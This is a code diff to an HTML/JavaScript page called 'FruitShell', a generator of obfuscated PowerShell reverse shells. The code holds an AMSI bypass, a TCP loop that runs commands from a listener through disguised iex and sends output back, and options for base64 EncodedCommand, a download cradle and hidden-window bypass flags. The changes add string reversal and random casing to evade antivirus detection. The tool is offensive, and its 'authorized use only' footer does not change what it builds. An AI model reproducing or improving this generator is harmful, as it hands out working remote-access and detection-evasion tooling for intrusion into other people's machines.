@@ -17,7 +17,7 @@
             color: #e2e9ff;
         }
         .shell-card {
-            max-width: 1080px;
+            max-width: 1100px;
             width: 100%;
             background: rgba(18, 25, 45, 0.94);
             backdrop-filter: blur(14px);
@@ -103,7 +103,7 @@
             color: #e2e9ff;
             white-space: pre-wrap;
             overflow-x: auto;
-            max-height: 460px;
+            max-height: 480px;
         }
         .flash { animation: flashAnim 0.9s ease; }
         @keyframes flashAnim { 0%,100% { background:#2a3a1e; } 50% { background:#1e2a1a; } }
@@ -122,10 +122,10 @@
 <div class="shell-card">
     <div class="fruit-header">
         <div class="title-badge">
-            <span>🍒🍊🍉🍍🥝</span>
+            <span>🍒🍊🍉🍍🥝🍓</span>
             <h1>FruitShell · Ultimate Stealth</h1>
         </div>
-        <div class="fruit-tag">🍇 AMSI + Invoke-Style Obfuscation + Compression 🥭</div>
+        <div class="fruit-tag">🍇 AMSI + Reversal + Token Chaos + Compression 🥭</div>
     </div>
 
     <div class="input-panel">
@@ -149,6 +149,7 @@
             <label><input type="checkbox" id="ultraMode" checked> Extra Fruit Chaos</label>
             <label><input type="checkbox" id="compressMode"> Compress + EncodedCommand</label>
             <label><input type="checkbox" id="cradleMode"> Use Download Cradle</label>
+            <label><input type="checkbox" id="oneLinerMode"> Force One-Liner Output</label>
         </div>
 
         <div style="display:flex; gap:1rem; flex-wrap:wrap;">
@@ -173,12 +174,12 @@
     </div>
 
     <footer>
-        🍌 Random fruit variables • AMSI bypass • Token randomization • Compression • Download cradle support • Pure client-side • Use only on authorized targets
+        🍌 Random fruit vars • AMSI bypass • String reversal • Case randomization • Pure client-side • Authorized use only
     </footer>
 </div>
 
 <script>
-    const fruitBase = ["mango","kiwi","lychee","papaya","guava","dragon","passion","starfruit","durian","jackfruit","rambutan","mangosteen","pitaya","tamarind","persimmon","quince","boysen","elder","goose","currant","pineapple","cherry","banana","orange"];
+    const fruitBase = ["mango","kiwi","lychee","papaya","guava","dragon","passion","starfruit","durian","jackfruit","rambutan","mangosteen","pitaya","tamarind","persimmon","quince","boysen","elder","goose","currant","pineapple","cherry","banana","orange","lime","lemon"];
 
     function getRandomFruit(used) {
         let avail = fruitBase.filter(f => !used.has(f));
@@ -188,11 +189,15 @@
         return picked;
     }
 
+    function randomCase(str) {
+        return str.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
+    }
+
     function obfuscateString(str, level) {
         let result = '';
         const used = new Set();
         for (let char of str) {
-            if (Math.random() < 0.35 + level * 0.18) {
+            if (Math.random() < 0.4 + level * 0.2) {
                 const f = getRandomFruit(used);
                 result += `$${f}='${char}';`;
             } else {
@@ -202,11 +207,15 @@
         return result.replace(/\s*\+\s*$/, '');
     }
 
-    function generateUltimateFruitShell(ip, portStr, stealthLevel, ultra, compress, cradle) {
+    function reverseString(s) {
+        return s.split('').reverse().join('');
+    }
+
+    function generateUltimateFruitShell(ip, portStr, stealthLevel, ultra, compress, cradle, oneLiner) {
         const used = new Set();
         const f = () => getRandomFruit(used);
 
-        // AMSI Bypass
+        // Improved AMSI bypass with more concatenation
         const amsi = `
 $a='System.Management.Automation.A';$b='msiUtils';
 $c=[Ref].Assembly.GetType($a+$b);
@@ -214,9 +223,9 @@ $d=$c.GetField('amsiInitFailed','NonPublic,Static');
 $d.SetValue($null,$true);`.trim();
 
         const client = f(); const stream = f(); const writer = f();
-        const buffer = f(); const data = f(); const raw = f(); const iexVar = f();
+        const buffer = f(); const data = f(); const raw = f();
 
-        // IP rebuilding with splitting
+        // IP splitting
         let ipAssignments = '';
         let ipExprParts = [];
         ip.split('').forEach(char => {
@@ -226,13 +235,14 @@ $d.SetValue($null,$true);`.trim();
         });
         const ipExpr = ipExprParts.join('+');
 
-        // Port as string
+        // Port
         let portExpr = `'${portStr}'`;
         if (stealthLevel >= 3) {
             portExpr = portStr.split('').map(c => `'${c}'`).join(' + ');
         }
 
-        // Core payload
+        // Core with reversal for iex
+        let iexReversed = reverseString('xei');
         let core = `
 ${amsi}
 $ErrorActionPreference = 'SilentlyContinue';
@@ -243,13 +253,14 @@ $${writer} = New-Object System.IO.StreamWriter($${stream});
 $${buffer} = New-Object Byte[] 4096;
 while (($${data} = $${stream}.Read($${buffer}, 0, $${buffer}.Length)) -ne 0) {
     $${raw} = (New-Object System.Text.UTF8Encoding).GetString($${buffer}, 0, $${data});
-    $${iexVar} = (&('i'+'e'+'x') $${raw} 2>&1 | Out-String);
-    $${writer}.WriteLine($${iexVar}); $${writer}.Flush();
+    $exec = &([string]::join('', '${iexReversed}'[(${iexReversed}.Length-1)..0])) $${raw} 2>&1 | Out-String;
+    $${writer}.WriteLine($exec); $${writer}.Flush();
 }
 $${client}.Close();`.trim();
 
         if (ultra) {
-            core = core.replace(/iex/g, `&('i'+'e'+'x')`);
+            // Add random case to some parts
+            core = core.replace(/New-Object/g, randomCase('New-Object'));
         }
 
         if (cradle) {
@@ -261,10 +272,15 @@ $${client}.Close();`.trim();
             return `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${b64}`;
         }
 
+        if (oneLiner) {
+            // Basic one-liner conversion (remove newlines, reduce whitespace)
+            core = core.replace(/\s+/g, ' ').trim();
+        }
+
         return core;
     }
 
-    // DOM Elements
+    // DOM setup (same as previous with added oneLinerMode)
     const ipInput = document.getElementById('ip');
     const portInput = document.getElementById('port');
     const stealthSlider = document.getElementById('stealthLevel');
@@ -272,6 +288,7 @@ $${client}.Close();`.trim();
     const ultraChk = document.getElementById('ultraMode');
     const compressChk = document.getElementById('compressMode');
     const cradleChk = document.getElementById('cradleMode');
+    const oneLinerChk = document.getElementById('oneLinerMode');
     const genBtn = document.getElementById('generateBtn');
     const copyBtn = document.getElementById('copyBtn');
     const copyEncodedBtn = document.getElementById('copyEncodedBtn');
@@ -280,36 +297,35 @@ $${client}.Close();`.trim();
     const outputArea = document.getElementById('shell-script');
     const statusHint = document.getElementById('statusHint');
 
-    // Update level display
     stealthSlider.addEventListener('input', () => {
         const lvl = parseInt(stealthSlider.value);
-        const emojis = ['🥭', '🍉', '🍓', '🍒'];
+        const emojis = ['🥭','🍉','🍓','🍒'];
         levelDisplay.textContent = `Level ${lvl} ${emojis[lvl-1]}`;
     });
 
     function handleGenerate() {
         const ip = ipInput.value.trim();
-        let portStr = portInput.value.trim();
+        const portStr = portInput.value.trim();
 
         if (!ip) {
-            outputArea.textContent = '⚠️ Please enter a valid Listener IP or hostname';
+            outputArea.textContent = '⚠️ Please enter Listener IP / hostname';
             statusHint.textContent = 'missing ip';
             return;
         }
         if (!portStr || isNaN(parseInt(portStr)) || parseInt(portStr) < 1 || parseInt(portStr) > 65535) {
-            outputArea.textContent = '⚠️ Port must be a number between 1 and 65535';
+            outputArea.textContent = '⚠️ Port must be a number 1–65535';
             statusHint.textContent = 'invalid port';
             return;
         }
 
         try {
             const payload = generateUltimateFruitShell(
-                ip,
-                portStr,
+                ip, portStr,
                 parseInt(stealthSlider.value),
                 ultraChk.checked,
                 compressChk.checked,
-                cradleChk.checked
+                cradleChk.checked,
+                oneLinerChk.checked
             );
 
             outputArea.textContent = payload;
@@ -322,54 +338,39 @@ $${client}.Close();`.trim();
             statusHint.textContent = '🍍 ultimate fruit shell ready!';
             setTimeout(() => statusHint.textContent = 'ready', 2500);
         } catch (e) {
-            outputArea.textContent = `Generation Error: ${e.message}`;
+            outputArea.textContent = `Error: ${e.message}`;
             statusHint.textContent = 'error';
         }
     }
 
-    function copyToClipboard(text, button, successMsg = '✅ Copied!') {
+    function copyToClipboard(text, button, msg = '✅ Copied!') {
         navigator.clipboard.writeText(text).then(() => {
-            const originalText = button.textContent;
-            button.textContent = successMsg;
-            setTimeout(() => button.textContent = originalText, 1800);
-        }).catch(() => {
-            statusHint.textContent = 'copy failed';
+            const orig = button.textContent;
+            button.textContent = msg;
+            setTimeout(() => button.textContent = orig, 1800);
         });
     }
 
     genBtn.addEventListener('click', handleGenerate);
     copyBtn.addEventListener('click', () => copyToClipboard(outputArea.textContent, copyBtn));
     copyEncodedBtn.addEventListener('click', () => {
-        const encoded = generateUltimateFruitShell(
-            ipInput.value.trim(),
-            portInput.value.trim(),
-            parseInt(stealthSlider.value),
-            ultraChk.checked,
-            true,
-            cradleChk.checked
-        );
+        const encoded = generateUltimateFruitShell(ipInput.value.trim(), portInput.value.trim(), parseInt(stealthSlider.value), ultraChk.checked, true, cradleChk.checked, oneLinerChk.checked);
         copyToClipboard(encoded, copyEncodedBtn, '✅ EncodedCommand Copied!');
     });
     copyFullBtn.addEventListener('click', () => {
-        const fullCmd = `powershell -NoP -NonI -W Hidden -Exec Bypass -c "${outputArea.textContent.replace(/"/g, '`"')}"`;
-        copyToClipboard(fullCmd, copyFullBtn, '✅ Full Command Copied!');
+        const full = `powershell -NoP -NonI -W Hidden -Exec Bypass -c "${outputArea.textContent.replace(/"/g, '`"')}"`;
+        copyToClipboard(full, copyFullBtn, '✅ Full Command Copied!');
     });
 
     clearBtn.addEventListener('click', () => {
-        ipInput.value = '';
-        portInput.value = '';
+        ipInput.value = ''; portInput.value = '';
         outputArea.textContent = '# Ready for another fresh stealth fruit shell... 🍍';
         copyBtn.disabled = copyEncodedBtn.disabled = copyFullBtn.disabled = true;
         statusHint.textContent = 'cleared';
         setTimeout(() => statusHint.textContent = 'ready', 1200);
     });
 
-    // Enter key support
-    [ipInput, portInput].forEach(input => {
-        input.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') handleGenerate();
-        });
-    });
+    [ipInput, portInput].forEach(el => el.addEventListener('keypress', e => { if (e.key === 'Enter') handleGenerate(); }));
 </script>
 </body>
 </html>
